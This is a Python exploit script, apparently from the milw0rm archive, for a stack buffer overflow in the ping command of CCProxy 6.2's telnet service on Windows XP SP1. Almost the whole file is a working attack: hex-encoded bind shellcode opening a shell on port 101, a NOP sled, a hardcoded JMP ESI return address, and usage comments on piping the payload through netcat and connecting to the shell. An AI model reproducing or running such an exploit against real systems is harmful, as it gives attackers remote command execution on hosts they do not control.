######################################################################
##  |------------------------------------------------------------|  ##
##  |    CCProxy 6.2 ping Remote Buffer Overflow Exploit         |  ##  
##  |      Based on Ruder's discovery,exploit by KaGra           |  ##  
##  |   Binds Shellcode aT 101,use netcat to connect back...     |  ##
##  |            Tested in WinXP SP1 EnGlish                     |  ##
##  |       Greedingz to:NinA,Coderz.gr and my musik BanD        |  ##
##  |------------------------------------------------------------|  ##
######################################################################

# Usage:exploit.py|nc Host port,where port is the telnet service of the target
# The buG exists when a long parameter is passed to ping command in telnet
# service of CCproxy server.This is a classic stack based overflow.Ret address
# is close to ESI,so a JMP ESI will do the trick.Other nops are just for padding...
#
#
#C:\exploit.py|nc localhost 23
#
#C:\nc -v localhost 101
#
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\xcv>





import struct

#BinD ShellCode aT PorT 101,taken from  muts exploit,thankz pul...

sc2 = "\xEB"
sc2 += "\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
sc2 += "\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
sc2 += "\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
sc2 += "\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
sc2 += "\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
sc2 += "\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
sc2 += "\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
sc2 += "\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
sc2 += "\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
sc2 += "\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
sc2 += "\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
sc2 += "\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
sc2 += "\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
sc2 += "\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
sc2 += "\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
sc2 += "\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
sc2 += "\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
sc2 += "\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
sc2 += "\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
sc2 += "\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
sc2 += "\x58\x68\x61\x63\x6B\x90"


buffer = '\x90'*605         # The usual nops... 

RETADDR="\xc7\x41\xe6\x77"  # JMP ESI In XP SP1 EnGliSH...

buff2='\x90'*8              # padding...

print "ping "+buffer+sc2+RETADDR+buff2 # DeaD...

// milw0rm.com [2004-11-10]
